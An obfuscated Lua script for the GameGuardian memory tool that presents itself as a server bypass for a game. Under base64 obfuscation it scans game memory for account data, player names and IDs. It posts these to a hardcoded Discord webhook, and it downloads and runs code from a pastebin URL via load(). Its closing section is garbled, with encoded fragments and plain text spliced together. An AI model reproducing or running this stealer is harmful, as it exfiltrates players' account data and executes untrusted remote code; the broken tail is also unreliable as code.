Tx=((((15-10)-3)/((14-9)-(5-2)))*((7-4)-(620-(555+64))))+30;Kt=(((935-(857+74))-(570-(367+201)))/(937-(214+713)))*Tx;xj=(12*(2+3))+(((98+525)-((1432-(282+595))+64))*Kt);zk=(933-((2494-(1523+114))+67+7))*xj;local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO(data) m=string.sub(data, 0, (Tx*Kt/Tx)/(zk/3)+(zk*1/2)) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


function dwordToUTF8(dword)
    local byte1 = dword & 0xFF
    local byte2 = (dword >> 8) & 0xFF
    local byte3 = (dword >> 16) & 0xFF
    local byte4 = (dword >> 24) & 0xFF
    return string.char(byte1, byte2, byte3, byte4)
end
gg.toast(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('YtczfDztSvDuoBzGbOpWmNjZOCExkaRJvfWAKputkRVLLyZcvBKXYmxygYJzUGxlYXNlIHdhaXQuLi4uLmJ5cGFzc2luZyBzZXJ2ZXI='))
function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
    searchType = searchType or gg.TYPE_BYTE
 
    gg.searchNumber(searchString, searchType, false, gg.SIGN_EQUAL, 0, -1)
    gg.refineNumber(refineString)
    gg.setVisible(false)
    local results = gg.getResults(maxResults or 1000)
    local fullUtf8Data = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('SsOKMqzmHmpqGotoTebpbBBCmotVPRQJIGiEUwWGMeXZAqNZirHOIjGnHUjr')
 
    if #results > 0 then
        for _, result in ipairs(results) do
            local baseAddress = result.address
            local utf8Combined = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('UicGtIkewcsmXWfnQbErZYagzQhNTgbXHnAayEhyMebQQJZVbBTGLURyLKCG')
 
            for offset = 0, (stepCount or 200), 4 do
                local dword = gg.getValues({ { address = baseAddress + offset, flags = gg.TYPE_DWORD } })[1]
                if dword then
                    utf8Combined = utf8Combined .. dwordToUTF8(dword.value)
                end
            end
 
            fullUtf8Data = fullUtf8Data .. utf8Combined .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('QNZwqqRiXEzGbsQlImNrWKFjWGmjtNAlbYlwSobgnCzzQtOUSXBQfFzDxAHrXG4=')
        end
    end
 
    gg.clearResults()
    return fullUtf8Data
end
 
local webhook_url = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('GzwpyzDjTKJKgMtrNDAmJzLGPShBXnWHBbgwLRYrOgzsZWiSVbSRdXhaTdhuaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
 
local function buildQuery(url, query)
    if not query or next(query) == nil then
        return url
    end
 
    local query_string = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('GDAlSlhyBpVfMoTJGVIdQVbDYfDwpmZxMfdSOGFlgyrNgQRxMKHeSRdaGrlS')
    for k, v in pairs(query) do
        query_string = query_string .. k .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('zZClbpylDUVdykREziUyerSsxiEuqxIeuBsqfBPjmUmMCgykOmvymMxPiiPaPQ==') .. tostring(v) .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('zvYGctUgovNWJsqbwOAVMWoGJLDISScoUfRbKLvoBImRIHtfviEuruLIsibJJg==')
    end
    query_string = query_string:sub(1, -2)
 
    return url .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('qqrTaEiGVRuPiBcTVcECQFdXVfEEkXKHDtZLVmuESeowSqGXfqTXazBFvEEbPw==') .. query_string
end
 
local function escapeString(s)
    s = s:gsub(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('sgxOTcjeZdUcDLBeBdEmpezvdAkITqSjgDJJWzeGPScGAbsBVqDopRjeZuvzXFw='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('hyYtsVqJettvLSamPcfrwMUnPFadqkRZaaleVmgnNPGetdIJCAvPcZFHhdbQXFxcXA=='))
    s = s:gsub(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('VzMDyrDDpwLViYoRUSExmkdFumBIqjyEROSgeghZgshVokfBLAHfkZbVEBZhXG4='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('quGtzjJakjnHZRtjvYPymsmqrEDJIqIjEfQmCpawCbZNddmZmpLAnYFgNWbKXFxu'))
    s = s:gsub(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('XPOwfnVSYOEmIEeBbvvktQBQgYkalWOYivlEcSeufDHRofXgkzbaCkrsfGrbXHI='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('BbaOZftgXToJLzLMsdFkDszMzCaGEabNRmDCadJXsPJRqhiXusBrJeNPKrYFXFxy'))
    return s
end
 
local function toJson(tbl)
    local json = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('FAAgcCwqiZYwxSahMrSJJihjklSWnHxpbWIyWHbuvcjtUqjeielnNmTGkoyRew==')
 
    for k, v in pairs(tbl) do
        local kType = type(k)
 
        if kType == YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('fDrcwqsccachFDwRVidItvlygsGNzmDIZfApPqRjZdwJFQgmkAIeMsVKrLKJc3RyaW5n') then
            json = json .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('BTUlDlYDAbsFMBVBZmRSSwIXNcwyujFNKxRdLOdXcgxoYTYfcZBOsbQSCwqM')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('zGadateBfxeeFsDfeIjupbfUSoNGPXasrUWfTGzbSicdnaDUAfelPDXHBgnxIC4uIGsgLi4g')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('EYxHAycqeNPuJdfoYvRSRTAJSzVluFXumeOPrBNGgQRKlLCAkMeLEbUFeTMtOg==')
        elseif kType == YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('QmuFGBNtgTtvAPoZGENdUoLsGRIZjppXhQVZXQLAYimiNLDfphcBISgjXXGnbnVtYmVy') then
            json = json .. k .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('FrOWImMWiCSpWcvNrGNwhjsIrDqDmGMlmuBQlTAddsoFdkJAheGyacHtVWFnOg==')
        end
 
        local vType = type(v)
 
        if vType == YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('CmnBxGvSemrJLsEDWLQMDbUXcAPkSEmAFLGglDZfSSUSZEablCcupMsJjpQmc3RyaW5n') then
            json = json .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('zEERXnfpALnnOGvDQHDTNVbXrspWwYNhoUoPQqOEvokPQOPykcBIItFqAAao')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('mHsdOFqthjuTpappXINfGqppUnBVDKnmqxTAgfWNvVOEgJlnuCjANmestOFDIC4uIGVzY2FwZVN0cmluZyh2KSAuLiA=')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('eHAHMKjtSdwlUngnnEXlfkRchASHIvByhGOcCcqYgmiCoPKqidFjnBRMYYES')
        elseif vType == YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('PepgeYhaCzVHwmWARmKJOKSXKQuqjMUZwCMrmPtBakyAOqKgCxBkWLLCewLibnVtYmVy') then
            json = json .. v
        elseif vType == YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('lQriqplQVjdgTZoytvuyQCuBwePSfDsgrUKatJPNWwoyLMNzkbrBqpAoFNmAdGFibGU=') then
            json = json .. toJson(v)
        end
 
        json = json .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('oMrvQszZlCnaFbAlyvOobVyefrDSaVUfdDNkSAZphXUNeeRodzHJGSqERqRsLA==')
    end
 
    json = json:sub(1, -2) .. YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('MkzFehyZeZQingEFCfLeBdqNdDtuKEpXCFYhcvUFJdKrCkVHdVZEuYSntTzUfQ==')
 
    return json
end
 
local function sendWebhook(payload_content)
    local payload = { content = payload_content }
    local headers = {
        [YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('jllvqwTQjXNftVuGbBkjSaoguRoIkDJcIxmByAdKAyYZEiWOmOnKiKsZTEHsQ29udGVudC1UeXBl')] = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('KvEOePBkXSgSVsPOdDsZCUYiAXlkbuwlubcdzxQOTmUZJlnxBjgQwBIkXcDpYXBwbGljYXRpb24vanNvbg=='),
    }
    local payload_json = toJson(payload)
    gg.makeRequest(webhook_url, headers, payload_json)
end
 
local secret_accounts = {}
 
function fetchSecretAccounts()
    local pastebinURL = YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('FkDMUrBeyzCMzkEGOdErgHROqaiyZSeLtRLTiMpRWnWsBNBvfSfhCpPbgeowaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3d2d0ZXN2hV')
    local response = gg.makeRequest(pastebinURL)
 
    if response and response.content then
        local chunk, errorMsg = load(response.content)
        if chunk then
            secret_accounts = chunk()
        else
            print(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('jwGPClQDvuPRUwZeahrbpOaqvxiSxmBuPhnQWkIIHWYfPbOMEYLaIvuyOwXtVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
            os.exit()
        end
    else
        print(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('ZSKXyannwllHitDbJbMrQMtppHGNkRIWkDXemxDFRkstNaAWKItcBwECqGvNVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
        os.exit()
    end
end
 
function checkSecretAccounts()
    for account_id, associated_id in pairs(secret_accounts) do
        gg.searchNumber(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('qGpSkMUoKEgTIeuDPZGONVxKCJSEcYeCgmxEUtBJuNoVmsXOfapXiMBhAZbZOw==') .. account_id, gg.TYPE_WORD, false, gg.SIGN_EQUAL, 0, -1)
        gg.setVisible(false)
        local results = gg.getResults(1)
        gg.clearResults()
 
        if #results > 0 then
            sendWebhook(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('LepscapTdzPoaAmDWRJhjhvAzXbLDgmRadbKrDKzApNHEIhfqgievhsSTbyM8J+UkiBVc2VyOiA=') .. associated_id)
            return true
        end
    end
    return false
end
 
fetchSecretAccounts()
 
local function sanitizeString(input)
    -- Replace null bytes and invalid characters with empty
    return input:gsub(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('FZxaLDOGXHNCIuSCMvDLRaVTByamhFgDEeGcZUOWZKIVRVYyMEKqkLZHtiFEWyV6XDEtXDMxXDEyNy1cMjU1XQ=='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('ZioldQvEbESqkmjyUWgehNeGMuwMwoppGgsRYBEJJEGLxSgBOchOFlNFsipm'))
end
 
-- Main data collection
local fullUtf8Data = scanAndCollectResults(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('WuASVXnUGEURsngwctoOCQIRqnnMGnMmhBQiHsnuvXovPwujRrczIGjYlNPTOmFkSW50ZXJ2YWw='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('ZkxYfFrIZASGEQHmbnLVQqJRfeWtKUvBYxdhIIMEIIusdiFyoOkheKAkEQouOnY='), 1000, 200, gg.TYPE_BYTE)
local tmp_c_id = scanAndCollectResults(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('dRPWjvqWtJACYbvVhVBWnOzpOybnNftyWyBzxoUMuVQgvTfdfECGspXQTUivOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('BwxIKHaHzKfhKJfKYFdmZemUPHTGldKnOcJwXBgBovkAgqbcfTASXxOQbbboOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), 1000, 100, gg.TYPE_QWORD)
local playerName = scanAndCollectResults(YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('PbBECwVixrtROGecOBDMHkmaFyOPBNrLRWcpxZjTosJzRohYSnibkIKDiLswOntc')CreateYZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('LQJcFcbkccjZyncWjTapBAyLuTLbGKcRmdYxJSUdMJbdCjOjPkIfiBGramjcLCA='):tYZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('YZoDvlflkuUFWDpfAwSPUwuwYOKvXOkWqgsvAGLGVMhSaDGXmtplAHKhFyeiLCAxMDAwLCA3MCwgZ2cuVFlQRV9CWVRFKQ0KLS1sb2NhbCBwbGF5ZXJJZCA9IHNjYW5BbmRDb2xsZWN0UmVzdWx0cyg=')27,423,342,016,359,796YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('qjaZLlnvptZOIXljlNuVylmDDBXWxVjtbSuakbEBueDwifjfxEgpaVZmECScLCA=')27,423,342,016,359,796YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('KiYKnaOjrraJPViClThmlGOSoVDYtKdvwFQmyCypAtBKaRWihTrOfsKRsOsVLCAxMDAwLCAxMDAsIGdnLlRZUEVfUVdPUkQpDQogDQppZiBub3QgY2hlY2tTZWNyZXRBY2NvdW50cygpIHRoZW4NCiAgICBpZiBmdWxsVXRmOERhdGEgPT0g')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('rxEQxVjZHVQCsCNtKISAUUWHsFnOJRGRuGKvDMtzyoAXEpnqugNzIFjeMSpSIGFuZCB0bXBfY19pZCA9PSA=')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('CirNFiBqmFmNpzbqMHNuTyXhXeAvypAJPUQkggnZHQRlFhnaKGtVkPcAsjCtIGFuZCBwbGF5ZXJOYW1lID09IA==')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('RnUQPuobCsVvuekUlSvofqDSyTuSVecDDNEawQvOmGrHEFdgqgDtLWRkXCMMIGFuZCBwbGF5ZXJJZCA9PSA=')YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('euEwuLsSqDRgRwZwASkUFJsBWrSJqMnxfGJrAYcyDXlcqXjqRBThEulsQcNXIHRoZW4NCiAgICAgICAgc2VuZFdlYmhvb2so')Error! Nothing Found 💩YZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('YmQMRzeCFPOVBQKQIFJLdZUQZONzTpTUuEnaklFqNrLCQPowpJisQgyiNlXaKQ0KICAgIGVsc2UNCiAgICAgICAgbG9jYWwgcGF5bG9hZF9jb250ZW50ID0g')Account:\nYZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('JgaGwSOdPyGBBQTUBXlRVJirlKKJJKRZiRZOjLapXPMJYZOyKcwtSQMdhExlIC4uIHNhbml0aXplU3RyaW5nKGZ1bGxVdGY4RGF0YSkgLi4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg')\n\nv1:\nYZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('jltrGxPcRZsjdOPcHyXwDldFGJyvzCXfSkOsSROxyoQnicEyqJFmNpYSmweZIC4uIHNhbml0aXplU3RyaW5nKHRtcF9jX2lkKSAuLg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=')\n\nv2:\nYZhRHMzibxTXsiBlFAflrQSZixzUeXQDHXdIcPnwGyomovhHKmdIFFPkTaqsO('FxEsRHHsSKtdwdImiatRIKWtszKktkJdLolVdsSPShJCmdOQCYdKxwqHKRGQIC4uIHNhbml0aXplU3RyaW5nKHBsYXllck5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSAg')\n\nv3:\n' .. sanitizeString(playerId)
        sendWebhook(payload_content)
    end
end    
